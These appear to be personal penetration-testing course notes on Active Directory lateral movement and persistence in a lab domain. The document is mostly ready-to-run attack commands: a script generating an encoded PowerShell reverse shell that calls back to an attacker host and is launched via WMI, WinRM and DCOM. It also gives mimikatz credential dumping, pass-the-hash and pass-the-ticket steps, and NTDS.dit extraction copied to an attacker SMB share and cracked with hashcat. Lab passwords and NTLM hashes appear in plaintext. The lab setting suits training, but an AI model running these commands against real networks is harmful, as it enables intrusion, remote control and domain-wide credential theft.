### WMI and WinRM
- WMI creates process and uses RPC on port 135
- In order to create a process on the remote target via WMI, we need credentials of a member of the Administrators local group, which can also be a domain user.

```
xfreerdp /u:jeff /p:HenchmanPutridBonbon11 /cert-ignore /compression /auto-reconnect /d:corp.com /v:192.168.250.74
wmic /node:192.168.250.73 /user:jen /password:Nexus123! process call create "calc"
```

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.250.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

python script to encode powershell reverse shell command
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.234",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

replace for use on windows box
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.250.72 -Credential $credential -SessionOption $Options
$Command = powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

WinRM is an alternative for WMI
```
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

powershell remoting
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.250.73 -Credential $credential
```
### VM 2
```
xfreerdp /u:jeff /p:HenchmanPutridBonbon11 /cert-ignore /compression /auto-reconnect /d:corp.com /v:192.168.250.74
winrs -r:192.168.250.72 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

# PSExec
- intended to replace telnet-like applications and provide remote execution of processes 
- on other systems through an interactive console
- first you need the user to be part of the Administrators local group
- then ADMIN$ share must be available and File and Printer Sharing has to be turned on (default settings)

```
xfreerdp /u:offsec /p:lab /cert-ignore /compression /auto-reconnect /v:192.168.250.74
```

from powershell, execute remote process
```
cd C:\Tools\SysinternalsSuite
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
./PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd
```


### Pass the Hash
- authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password
- Similar to PsExec, this technique requires an SMB connection through the firewall (commonly port 445) and the Windows File and Printer Sharing feature to be enabled
- also requires the admin share called ADMIN$ to be available aka typically requires local administrative rights
- https://tools.thehacker.recipes/impacket

```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.250.73
```

### Overpass the hash
- we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). 
- Then we can use the TGT to obtain a Ticket Granting Service (TGS).

```
xfreerdp /cert-ignore /u:jeff /p:HenchmanPutridBonbon11 /v:192.168.250.76
```

- run notepad as diff user (shift+left click)
- start powershell as Administrator
```
cd C:\Tools
```
- start mimikatz (we want NTLM hashes)
```
.\mimikatz.exe
```
- engage the SeDebugPrivlege privilege, which will allow us to interact with a process owned by another account
```
privilege::debug
```
- dump the credentials of all logged-on users
```
sekurlsa::logonpasswords
```

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
will still show jeff on whoami, process doesn't show tickets

generate a TGT by authenticating to a network share on the files04 server with net use.
```
net use \\files04
klist # now this will show cached tickets
```
We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application

Once run, we are the jen user
```
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\files04 cmd
whoami
hostname
```

### VM 2
```
cd C:\Tools
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
net use \\web04
klist
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\web04 cmd
```


### pass the ticket
- we are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session.
- dave has hiver privs than jen

```
xfreerdp /cert-ignore /u:jen /p:Nexus123! /v:192.168.250.76

whoami
ls \\web04\backup

cd C:\Tools
.\mimikatz.exe
privilege::debug
```

export all the TGT/TGS from memory
```
sekurlsa::tickets /export
```

find newly generated tickets (from C:\Tools)
```
dir *.kirbi
```

we can pick any of dave's tickets to inject (that are web04)
```
kerberos::ptt [0;14a20d]-0-0-40810000-dave@cifs-web04.kirbi
```

then do klist to verify ticket for dave added (has to be same window as mimikatz)
```
klist
```

### DCOM (distributed component model)
Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager

```
xfreerdp /cert-ignore /u:jen /p:Nexus123! /v:192.168.250.74
```

from powershell as administratorspawn an instance of the calculator app
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.250.72"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

try our reverse shell payload
```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")
```


### Active Directory persistence
access to the target network has to carry on after a reboot or even a credential change

### Golden Ticket
- in Kerberos authentication, when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. 
- This secret key is actually the password hash of a domain user account called krbtgt
- If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
- While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources, as we'll see shortly

### Shadow copies
- also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes
- we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file
- we can use this to extract every user credential

```
xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.201.70
```

from CMD as administrator and take a snapshot
```
cd C:\Tools
.\vshadow.exe -nw -p  C:
```
we want this data: Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

copy entire AD database from the shadow copy
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
```

to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry
```
cd C:
reg.exe save hklm\system c:\system.bak
```

need to copy these files to kali
```
impacket-smbserver -smb2support -user jeffadmin -password BrouhahaTungPerorateBroom2023! smb smb 
impacket-smbserver -smb2support smb smb 
```

from windows - cmd
```
net use \\192.168.45.219\smb
copy ntds.dit.bak \\192.168.45.181\smb
```

dump secrets to get NTLM hashes
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

hashcat -m 1000 adminhash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

xfreerdp /cert-ignore /u:administrator /d:corp.com /p:lab /v:192.168.201.70
```

### Capstone VM 3
```
xfreerdp /cert-ignore /u:leon /d:corp.com /p:HomeTaping199! /v:192.168.201.74
```

enumerate users
```
cd C:\tools
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetUser
```

see what box leon has admin access on
```
crackmapexec smb 192.168.201.70-192.168.201.76 -u leon -p HomeTaping199!

xfreerdp /cert-ignore /u:leon /d:corp.com /p:HomeTaping199! /v:192.168.201.73
```

### Capstone VM 4
```
xfreerdp /cert-ignore /u:leon /p:HomeTaping199! /v:192.168.201.76
```

dave NTLM hash - 08d7a47a6f9f66b97b1bae4178747494
```
hashcat -m 1000 davehash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

crackmapexec smb 192.168.201.70-192.168.201.76 -u dave -p Flowers1

xfreerdp /cert-ignore /u:dave /d:corp.com /p:Flowers1 /v:192.168.201.72
crackmapexec smb 192.168.201.70-192.168.201.76 -u dave -p Flowers1
```

what we really want is to access the shared folder by injecting a ticket
```
kerberos::ptt [0;1dde6e]-0-0-40810000-dave@cifs-web04.kirbi
```












